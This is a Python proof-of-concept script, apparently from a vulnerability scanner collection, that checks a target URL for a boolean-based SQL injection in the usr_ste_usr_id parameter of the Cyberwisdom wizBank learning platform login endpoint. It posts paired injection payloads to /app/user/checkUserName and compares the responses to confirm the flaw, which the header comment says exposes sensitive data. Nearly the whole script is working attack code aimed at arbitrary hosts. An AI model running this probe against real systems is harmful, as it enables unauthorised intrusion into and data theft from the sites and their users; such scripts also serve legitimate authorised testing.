#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: Cyberwisdom wizBank学习管理平台SQL注入漏洞
referer: http://www.wooyun.org/bugs/wooyun-2016-0166301
author: Lucifer
description: Cyberwisdom wizBank 6.0和6.1版本的登录页面参数usr_ste_usr_id存在SQL注入，可获取敏感数据
'''
import sys
import json
import requests
import warnings
from termcolor import cprint

class wizbank_usr_id_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        reqlst = []
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }
        for postdata in [r"admin' AND '1'='1", r"admin' AND '1'='2"]:
            payload = {
                "usr_ste_usr_id":postdata,
                }
            vulnurl = self.url + r"/app/user/checkUserName"
            try:
                req = requests.post(vulnurl, headers=headers, data=payload, timeout=10, verify=False)
                reqlst.append(str(req.text))

            except:
                cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")

        if r"true" in reqlst[0] and r"false" in reqlst[1]:
            if len(req.text) < 50:
                cprint("[+]存在wizBank学习系统SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(payload, indent=4), "red")
                return True, vulnurl, "Cyberwisdom wizBank学习管理平台SQL注入漏洞", str(payload), req.text
            else:
                cprint("[-]不存在wizbank_usr_id_sqli漏洞", "white", "on_grey")
                return False, None, None, None, None
        return False, None, None, None, None
if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = wizbank_usr_id_sqli_BaseVerify(sys.argv[1])
    testVuln.run()
